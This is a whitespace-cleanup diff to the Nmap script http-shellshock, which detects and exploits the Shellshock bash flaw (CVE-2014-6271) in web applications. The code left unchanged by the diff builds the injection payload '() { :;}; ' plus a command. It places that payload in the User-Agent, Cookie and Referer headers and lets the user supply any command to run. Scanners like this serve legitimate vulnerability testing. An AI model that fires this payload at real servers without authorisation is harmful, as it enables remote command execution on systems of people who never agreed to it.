@@ -7,12 +7,12 @@ local vulns = require "vulns"
 description = [[
 Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications.
 
-To detect this vulnerability the script executes a command that prints a 
+To detect this vulnerability the script executes a command that prints a
 random string and then attempts to find it inside the response body. Web apps that
  don't print back information won't be detected with this method.
 
 By default the script injects the payload in the HTTP headers User-Agent,
- Cookie, Referer and also uses the payload as the header name.   
+ Cookie, Referer and also uses the payload as the header name.
 
 Vulnerability originally discovered by Stephane Chazelas.
 
@@ -23,20 +23,20 @@ References:
 * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
 ]]
 
--- @usage 
+-- @usage
 -- nmap -sV -p- --script http-shellshock <target>
 -- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
--- | http-shellshock: 
+-- | http-shellshock:
 -- |   VULNERABLE:
 -- |   HTTP Shellshock vulnerability
 -- |     State: VULNERABLE (Exploitable)
 -- |     IDs:  CVE:CVE-2014-6271
--- |       This web application might be affected by the vulnerability known as Shellshock. It seems the server 
--- |       is executing commands injected via malicious HTTP headers. 
--- |             
+-- |       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+-- |       is executing commands injected via malicious HTTP headers.
+-- |
 -- |     Disclosure date: 2014-09-24
 -- |     References:
 -- |       http://www.openwall.com/lists/oss-security/2014/09/24/10
@@ -51,7 +51,7 @@ References:
 -- <elem>CVE:CVE-2014-6271</elem>
 -- </table>
 -- <table key="description">
--- <elem>This web application might be affected by the vulnerability known as Shellshock. It seems the server 
+-- <elem>This web application might be affected by the vulnerability known as Shellshock. It seems the server
 -- &#xa;is executing commands injected via malicious HTTP headers. &#xa;      </elem>
 -- </table>
 -- <table key="dates">
@@ -82,7 +82,7 @@ function generate_http_req(host, port, uri, custom_header, cmd)
   local rnd = nil
   --Set custom or probe with random string as cmd
   if cmd ~= nil then
-    cmd = '() { :;}; '..cmd 
+    cmd = '() { :;}; '..cmd
  else
     rnd = stdnse.generate_random_string(15)
     cmd = '() { :;}; echo; echo "'..rnd..'"'
@@ -104,7 +104,7 @@ function generate_http_req(host, port, uri, custom_header, cmd)
 
   if not(cmd) then
     return req
-  else 
+  else
     return req, rnd
   end
 end
@@ -113,16 +113,16 @@ action = function(host, port)
   local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
   local http_header = stdnse.get_script_args(SCRIPT_NAME..".header") or nil
   local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
-  local rnd = nil 
+  local rnd = nil
   local req, rnd = generate_http_req(host, port, uri, http_header, nil)
   if req.status == 200 and string.match(req.body, rnd) ~= nil then
     local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
     local vuln = {
       title = 'HTTP Shellshock vulnerability',
-      state = vulns.STATE.NOT_VULN, 
+      state = vulns.STATE.NOT_VULN,
       description = [[
-This web application might be affected by the vulnerability known as Shellshock. It seems the server 
-is executing commands injected via malicious HTTP headers. 
+This web application might be affected by the vulnerability known as Shellshock. It seems the server
+is executing commands injected via malicious HTTP headers.
       ]],
       IDS = {CVE = 'CVE-2014-6271'},
       references = {
